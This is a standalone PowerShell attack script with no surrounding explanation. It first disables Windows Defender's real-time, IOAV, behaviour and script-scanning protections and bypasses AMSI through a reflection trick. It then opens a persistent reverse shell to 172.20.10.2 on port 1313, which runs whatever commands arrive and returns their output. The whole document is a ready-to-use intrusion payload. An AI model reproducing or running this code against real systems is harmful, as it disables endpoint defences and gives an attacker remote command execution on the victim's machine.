Set-MpPreference -DisableRealtimeMonitoring $true -ea 0; 
Set-MpPreference -DisableIOAVProtection $true -ea 0; 
Set-MpPreference -DisableBehaviorMonitoring $true -ea 0; Set-MpPreference -DisableScriptScanning $true -ea 0;

$null=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

$ip='172.20.10.2'
$port=1313

$0='while($true){try{$c=New-Object Net.Sockets.TCPClient(''$ip'',$port);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+''PS ''+(pwd).Path+''> ''; $sb3=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sb3,0,$sb3.Length);$s.Flush()};$c.Close()}catch{Start-Sleep -Seconds 10}}'

iex $0
